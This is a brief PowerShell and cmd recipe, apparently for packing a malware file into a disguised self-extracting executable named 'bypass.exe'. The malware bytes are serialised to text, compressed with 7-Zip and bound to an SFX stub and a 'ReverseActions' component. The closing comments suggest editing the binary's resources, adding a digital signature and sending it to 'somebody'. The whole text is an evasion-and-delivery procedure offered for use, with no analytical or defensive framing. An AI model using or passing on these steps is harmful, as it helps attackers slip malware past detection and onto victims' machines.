[String]::Join(' ', [IO.File]::ReadAllBytes(#malware)) | Out-File -enc ASCII raw
&7za a -mx9 raw.zip raw
&cmd copy /b raw.zip + ZipSFX + ReverseActions bypass.exe
#optional:
#1) edit bypass.exe with resource editor
#2) add digital signature
#at last do not forget send it somebody
